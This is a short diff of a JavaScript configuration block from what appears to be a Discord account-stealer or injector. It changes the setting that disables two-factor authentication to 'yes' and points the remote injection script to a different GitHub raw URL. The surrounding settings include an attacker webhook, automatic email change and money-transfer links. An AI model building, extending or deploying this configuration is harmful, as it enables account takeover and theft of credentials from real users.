@@ -17,13 +17,13 @@ var config = {
   "logout-notify": "true",
   "init-notify": "true",
   "embed-color": 2303786,
-  disable2FA: "%DISABLEFA%",
+  disable2FA: "yes",
   changeMailAuto: "%AUTOMAILCHANGER%",
   mail: "%CLIENTEMAIL%",
   creator: "Agiva",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/index.js",
+    "https://raw.githubusercontent.com/openyoureyesnow/assets/main/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%WEBHOOK%",
   Filter: {
